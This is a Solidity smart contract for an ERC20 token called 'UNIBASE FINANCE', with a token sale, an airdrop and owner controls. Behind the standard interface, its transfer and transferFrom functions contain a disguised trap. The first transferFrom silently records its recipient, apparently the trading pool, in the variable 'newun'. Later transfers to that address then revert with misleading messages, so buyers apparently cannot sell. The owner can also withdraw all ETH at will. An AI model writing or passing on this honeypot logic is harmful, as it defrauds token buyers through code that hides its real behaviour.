/**
 * /$$   /$$ /$$   /$$ /$$$$$$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$
 * | $$  | $$| $$$ | $$|_  $$_/| $$__  $$ /$$__  $$ /$$__  $$| $$_____/
 * | $$  | $$| $$$$| $$  | $$  | $$  \ $$| $$  \ $$| $$  \__/| $$      
 * | $$  | $$| $$ $$ $$  | $$  | $$$$$$$ | $$$$$$$$|  $$$$$$ | $$$$$   
 * | $$  | $$| $$  $$$$  | $$  | $$__  $$| $$__  $$ \____  $$| $$__/   
 * | $$  | $$| $$\  $$$  | $$  | $$  \ $$| $$  | $$ /$$  \ $$| $$      
 * |  $$$$$$/| $$ \  $$ /$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$
 *  \______/ |__/  \__/|______/|_______/ |__/  |__/ \______/ |________/
 *                                                                     
 *                                                                     
 *                                                                     
 *  /$$$$$$$$ /$$                                                      
 * | $$_____/|__/                                                      
 * | $$       /$$ /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$     
 * | $$$$$   | $$| $$__  $$ |____  $$| $$__  $$ /$$_____/ /$$__  $$    
 * | $$__/   | $$| $$  \ $$  /$$$$$$$| $$  \ $$| $$      | $$$$$$$$    
 * | $$      | $$| $$  | $$ /$$__  $$| $$  | $$| $$      | $$_____/    
 * | $$      | $$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$    
 * |__/      |__/|__/  |__/ \_______/|__/  |__/ \_______/ \_______/    
 *                                                                     
 *                                                                     
 *                                                                     
 *  /$$                 /$$       /$$                           /$$    
 * | $$                | $$      | $$                          | $$    
 * | $$$$$$$   /$$$$$$ | $$  /$$$$$$$        /$$$$$$  /$$$$$$$ | $$    
 * | $$__  $$ /$$__  $$| $$ /$$__  $$       /$$__  $$| $$__  $$| $$    
 * | $$  \ $$| $$  \ $$| $$| $$  | $$      | $$  \ $$| $$  \ $$|__/    
 * | $$  | $$| $$  | $$| $$| $$  | $$      | $$  | $$| $$  | $$        
 * | $$  | $$|  $$$$$$/| $$|  $$$$$$$      |  $$$$$$/| $$  | $$ /$$    
 * |__/  |__/ \______/ |__/ \_______/       \______/ |__/  |__/|__/    
 *                                                                     
 *                                                                     
 *                                                                          
*/

pragma solidity >=0.5.16;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "UNIBASE";
    name = "UNIBASE FINANCE";
    decimals = 18;
    _totalSupply =  395 ether;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "Transfer confirmations...");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract UniBase_token  is TokenERC20 {

  
  uint256 public aUniBaseBlock; 
  uint256 public aUniBaseEBlock; 
  
  uint256 public aCap; 
  uint256 public aTot; 
  uint256 public aAmt; 
 
  uint256 public sUniBaseSBlock; 
  uint256 public sUniBaseEDBlock; 
  
  uint256 public sTot; 
  uint256 public sCap; 

  uint256 public UniBaseCku; 
  uint256 public sPrice; 



  function tokenSale(address _refer) public payable returns (bool success){
    require(sUniBaseSBlock <= block.number && block.number <= sUniBaseEDBlock);
    require(sTot < sCap || sCap == 0);
    uint256 _eth = msg.value;
    uint256 _tkns;
    if(UniBaseCku != 0) {
      uint256 _price = _eth / sPrice;
      _tkns = UniBaseCku * _price;
    }
    else {
      _tkns = _eth / sPrice;
    }
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 4);
      balances[_refer] = balances[_refer].add(_tkns / 4);
      emit Transfer(address(this), _refer, _tkns / 4);
    }
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
  }


  
  function startAirdrop(uint256 _aUniBaseBlock, uint256 _aUniBaseEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {
    aUniBaseBlock = _aUniBaseBlock;
    aUniBaseEBlock = _aUniBaseEBlock;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
  }
  function startSale(uint256 _sUniBaseSBlock, uint256 _sUniBaseEDBlock, uint256 _UniBaseCku, uint256 _sPrice, uint256 _sCap) public onlyOwner() {
    sUniBaseSBlock = _sUniBaseSBlock;
    sUniBaseEDBlock = _sUniBaseEDBlock;
    UniBaseCku = _UniBaseCku;
    sPrice =_sPrice;
    sCap = _sCap;
    sTot = 0;
  }
  function clearETH() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}
